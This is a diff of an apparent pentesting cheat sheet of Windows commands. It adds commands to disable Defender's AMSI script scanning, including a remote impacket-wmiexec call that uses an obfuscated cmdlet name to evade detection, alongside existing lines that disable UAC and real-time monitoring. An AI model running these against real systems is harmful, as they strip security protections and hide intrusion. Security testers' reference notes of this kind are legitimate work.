@@ -241,9 +241,12 @@ Windows Commands
       Disable: reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
       Enable:  reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
 
-  Disable Defender
+  Modify Defender
+    https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=win10-ps
       Powershell Set-MpPreference -DisableRealtimeMonitoring $true ($false turns it on)
       Powershell Add-MpPreference -ExclusionPath "C:\Temp" (Excludes a folder)
+      Powershell Set-MpPreference -DisableScriptScanning 1 (Disable AMSI; set to 0 to enable)
+        impacket-wmiexec Administrator:'password'@10.10.10.10 "Powershell.exe .('{3}{2}{4}{1}{0}'-f 'e','nc','Prefe','Set-Mp','re') -DisableScriptScanning 1"
   
   Opens Powershell as Administrator
       Start-Process PowerShell -Verb RunAs
